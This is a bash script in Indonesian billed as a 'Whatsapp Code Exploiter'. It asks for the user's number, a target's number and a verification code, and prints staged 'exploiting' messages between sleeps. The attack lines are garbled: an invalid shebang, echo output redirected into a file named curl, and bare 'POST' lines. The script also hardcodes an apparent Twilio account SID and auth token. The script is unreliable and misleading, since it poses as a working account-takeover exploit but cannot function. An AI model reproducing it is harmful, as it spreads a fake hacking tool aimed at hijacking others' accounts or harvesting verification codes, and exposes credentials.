#!/bin/hash
#ACCOUNT SID="ACa8c0040bb540fa8e2cd14d95b0f82888";       
#incoming phone numbers = "https://www.twilio.com/console/phone-numbers/instance/PN531fc3a1b14ae13bb87c9a9947a2d294/messages";
#AUTH TOKEN: "342ce811752235637f36a5eada5b1f40";
echo "
<--www.twilio.com-->
####################
#   Whatsapp Code  # 
#     Exploiter    # 
####################

Copyright © 2019 TWILIO INC.
ALL RIGHTS RESERVED.";
echo "";
read -p "Nomer Kamu (+62xxxx)=> " nomer;
read -p "Nomer Target (+62xxxx) => " target;
sleep 2
echo "[+] Syncing Target...";
sleep 1
echo "Login  => $nomer";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] Exploiting...";
echo "Nomer => $nomer" >> curl -XPOST https://api.twilio.com/2010-04-01/Accounts/ACa8c0040bb540fa8e2cd14d95b0f82888/IncomingPhoneNumbers/PN531fc3a1b14ae13bb87c9a9947a2d294.json \ --data-urlencode "SmsUrl=http://www.mysite.com/twilio" \ -u 342ce811752235637f36a5eada5b1f40:your_auth_token
POST https://api.twilio.com/2010-04-01/Accounts/ACa8c0040bb540fa8e2cd14d95b0f82888/IncomingPhoneNumbers/PN531fc3a1b14ae13bb87c9a9947a2d294.json \ --data-urlencode "SmsUrl=http://www.mysite.com/twilio" \ -u 342ce811752235637f36a5eada5b1f40:your_auth_token
sleep 5
echo "[+] Done.";
echo "Tunggu 5-10 Menit Untuk Mendapatkan Code.";
read -p "Verify Code => " code;
sleep 2
echo "[+] Connecting to whatsapp.com...";
echo "Login => $nomer";
sleep 0.5
echo "Code => $code";
sleep 0.5                                                                               
echo "Target => $target";
sleep 0.5
echo "[+] Sending Exploit...";
echo "Code => $code" >> https://api.twilio.com/2010-04-01/Accounts/ACa8c0040bb540fa8e2cd14d95b0f82888/IncomingPhoneNumbers/PN531fc3a1b14ae13bb87c9a9947a2d294.json \ --data-urlencode "SmsUrl=http://www.mysite.com/twilio" \ -u 342ce811752235637f36a5eada5b1f40:your_auth_token , 
POST https://api.twilio.com/2010-04-01/Accounts/ACa8c0040bb540fa8e2cd14d95b0f82888/IncomingPhoneNumbers/PN531fc3a1b14ae13bb87c9a9947a2d294.json \ --data-urlencode "SmsUrl=http://www.mysite.com/twilio" \ -u 342ce811752235637f36a5eada5b1f40
sleep 5
echo "[+] Success Exploited!";
exit;
